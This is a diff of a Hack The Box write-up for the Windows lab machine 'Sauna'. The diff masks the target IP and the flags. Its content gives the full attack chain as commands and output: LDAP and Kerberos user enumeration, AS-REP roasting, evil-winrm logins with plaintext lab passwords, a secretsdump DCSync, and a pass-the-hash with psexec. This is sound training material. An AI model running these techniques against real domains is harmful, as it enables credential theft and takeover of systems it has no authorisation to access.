@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Sauna
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-sauna-infocard.png)
-
 A fairly easy Windows machine that requires a little 'outside the box' thinking in order to get the initial foothold.  After that, simple enumeration will give everything else that is needed.
 
 ## Useful Skills and Tools
@@ -22,18 +20,18 @@ A fairly easy Windows machine that requires a little 'outside the box' thinking 
 #### psexec.py
 
 * You can use `psexec` to pass-the-\(NT\)hash to get system privileges.  A valid administrator account username and hash are needed.
-* `sudo python3 psexec.py -hashes :<password_hash> Administrator@10.10.10.175` 
+* `sudo python3 psexec.py -hashes :<password_hash> Administrator@<YOUR_IP>` 
 
 #### secretsdump.py
 
 * Use this to dump password hashes from `NTDS.DIT` from a domain server.  Requires valid user credentials.  
-* `python3 ./secretsdump.py <domain_name>/<username>@10.10.10.175` 
+* `python3 ./secretsdump.py <domain_name>/<username>@<YOUR_IP>` 
 * Adding the flag `-just-dc-ntlm` will make it dump only the Lanman and NT hashes.
 
 #### GetNPUsers.py
 
 * Extracts the Kerberos `krb5asrep` hashes for users from the domain controller.  This requires a valid `DOMAINNAME/username` pair to run.  Will only extract hashes for users that do not require Kerberos pre-authentication. 
-* `python3 GetNPUsers.py -outputfile <out_file> -format hashcat -usersfile <username_file> -no-pass -dc-ip 10.10.10.175 <domain_name>/<user_name>`
+* `python3 GetNPUsers.py -outputfile <out_file> -format hashcat -usersfile <username_file> -no-pass -dc-ip <YOUR_IP> <domain_name>/<user_name>`
 * In this example the output will be in hashcat format.
 
 ### Extracting Windows Auto-logon credentials with `reg query`
@@ -53,12 +51,12 @@ In the Metasploit console the `auxiliary(gather/kerberos_enumusers)` tool enumer
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.175`. The options I regularly use are: `-p-`which is a shortcut which tells nmap to scan all ports, `-sC`  is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN`  saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`which is a shortcut which tells nmap to scan all ports, `-sC`  is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN`  saves the output with a filename of `<name>`.
 
 ```text
-zweilos@kalimaa:~/htb/sauna$ sudo nmap -p- -sC -sV -oN sauna.nmap 10.10.10.175
+zweilos@kalimaa:~/htb/sauna$ sudo nmap -p- -sC -sV -oN sauna.nmap <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-01 14:07 EDT
-Nmap scan report for 10.10.10.175
+Nmap scan report for <YOUR_IP>
 Host is up (0.14s latency).
 Scanned at 2020-06-01 14:07:43 EDT for 553s
 Not shown: 65515 filtered ports
@@ -132,7 +130,7 @@ Lots of ports were open on this machine! Based on the plethora of related ports,
 ### ldapsearch enumeration
 
 ```text
-zweilos@kalimaa:~/htb/sauna$ ldapsearch -H ldap://10.10.10.175:3268 -x -LLL -s sub -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
+zweilos@kalimaa:~/htb/sauna$ ldapsearch -H ldap://<YOUR_IP>:3268 -x -LLL -s sub -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
 dn: DC=EGOTISTICAL-BANK,DC=LOCAL
 objectClass: top
 objectClass: domain
@@ -265,19 +263,19 @@ Finding user credentials was pretty fast and straightforward for this machine, d
 
 ```text
 msf5 auxiliary(gather/kerberos_enumusers) > run
-[*] Running module against 10.10.10.175
+[*] Running module against <YOUR_IP>
 
 [*] Validating options...
 [*] Using domain: EGOTISTICALBANK...
-[*] 10.10.10.175:88 - Testing User: "hsmith"...
-[*] 10.10.10.175:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.175:88 - User: "hsmith" is present
+[*] <YOUR_IP>:88 - Testing User: "hsmith"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "hsmith" is present
 ```
 
 After running this scan, I only got back one hit for a valid username `hsmith`. I now had a valid username and the business format for other potential usernames . One oddity I noticed: the scan would crash Metasploit for some reason when it got to the name `fsmith` \(_I tried this multiple times with and without that name to be sure_\). I kept this username on the possibly valid list just in case.
 
 ```text
-zweilos@kalimaa:~/impacket/examples$ python3 GetNPUsers.py -outputfile sauna.hash -format hashcat -usersfile /home/zweilos/htb/sauna/users -no-pass -dc-ip 10.10.10.175 EGOTISTICALBANK/hsmith
+zweilos@kalimaa:~/impacket/examples$ python3 GetNPUsers.py -outputfile sauna.hash -format hashcat -usersfile /home/zweilos/htb/sauna/users -no-pass -dc-ip <YOUR_IP> EGOTISTICALBANK/hsmith
 
 [-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
@@ -342,7 +340,7 @@ Including the time spent building the dictionary file and getting everything loa
 Now that I had a username and password, I could try to log into the server using `evil-winrm`.  This tool connects to the Windows Remote Management service that is usually open on port 5985.
 
 ```text
-zweilos@kalimaa:~/htb/sauna$ evil-winrm -i 10.10.10.175 -u fsmith 
+zweilos@kalimaa:~/htb/sauna$ evil-winrm -i <YOUR_IP> -u fsmith 
 Enter Password: Thestrokes23
 
 Evil-WinRM shell v2.3
@@ -357,7 +355,6 @@ USER INFORMATION
 User Name              SID
 ====================== ==============================================
 egotisticalbank\fsmith S-1-5-21-2966785786-3096785034-1186376766-1105
-
 
 GROUP INFORMATION
 -----------------
@@ -374,7 +371,6 @@ NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandat
 NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -383,7 +379,6 @@ Privilege Name                Description                    State
 SeMachineAccountPrivilege     Add workstations to domain     Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
 
 USER CLAIMS INFORMATION
 -----------------------
@@ -398,7 +393,7 @@ Luckily for me `fsmith` was a member of the `Remote Management Users` group and 
 
 ```text
 *Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
-1b5520b98d97cf17f24122a55baf70cf
+****
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -471,7 +466,7 @@ For some reason there was a discrepancy between the username of the account that
 ### Moving laterally to user `svc_loanmgr`
 
 ```text
-zweilos@kalimaa:~/htb/sauna$ evil-winrm -i 10.10.10.175 -u svc_loanmgr
+zweilos@kalimaa:~/htb/sauna$ evil-winrm -i <YOUR_IP> -u svc_loanmgr
 Enter Password: Moneymakestheworldgoround!
 
 Evil-WinRM shell v2.3
@@ -486,7 +481,6 @@ USER INFORMATION
 User Name                   SID
 =========================== ==============================================
 egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108
-
 
 GROUP INFORMATION
 -----------------
@@ -503,7 +497,6 @@ NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandat
 NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -512,7 +505,6 @@ Privilege Name                Description                    State
 SeMachineAccountPrivilege     Add workstations to domain     Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
 
 USER CLAIMS INFORMATION
 -----------------------
@@ -525,7 +517,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 If you have credentials you can use Impacket's `secretsdump.py` to try to dump password hashes. These hashes can then be used to either crack and retrieve the passwords or in a pass-the-hash attack.  
 
 ```text
-zweilos@kalimaa:~/impacket/examples$ python3 ./secretsdump.py -just-dc-ntlm EGOTISTICALBANK/svc_loanmgr@10.10.10.175
+zweilos@kalimaa:~/impacket/examples$ python3 ./secretsdump.py -just-dc-ntlm EGOTISTICALBANK/svc_loanmgr@<YOUR_IP>
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
 Password:
@@ -548,14 +540,14 @@ After successfully extracting the password hash for the `Administrator` account 
 The blog at [https://en.hackndo.com/pass-the-hash/](https://en.hackndo.com/pass-the-hash/) has a nice write-up on how and why pass-the-hash attacks work.  I used the `psexec.py` tool from Impacket's examples, though there are many tools for doing this attack against Windows.  
 
 ```text
-zweilos@kalimaa:~/impacket/examples$ sudo python3 psexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff Administrator@10.10.10.175
+zweilos@kalimaa:~/impacket/examples$ sudo python3 psexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff Administrator@<YOUR_IP>
 Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
 
-[*] Requesting shares on 10.10.10.175.....
+[*] Requesting shares on <YOUR_IP>.....
 [*] Found writable share ADMIN$
 [*] Uploading file useqULkm.exe
-[*] Opening SVCManager on 10.10.10.175.....
-[*] Creating service hsLI on 10.10.10.175.....
+[*] Opening SVCManager on <YOUR_IP>.....
+[*] Creating service hsLI on <YOUR_IP>.....
 [*] Starting service hsLI.....
 [!] Press help for extra shell commands
 Microsoft Windows [Version 10.0.17763.973]
@@ -574,9 +566,5 @@ The final thing to do after gaining full control over this machine was to get my
 ```text
 C:\Windows\system32>cat C:\users\administrator\desktop\root.txt
 
-f3ee04965c68257382e31502cc5e881f
+****
 ```
-
-Thanks to [egotisticalSW](https://app.hackthebox.eu/users/94858) for creating this fun and easy Windows machine.  It offered a few chances to learn some new things while giving the opportunity to brush up on Windows enumeration skills.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
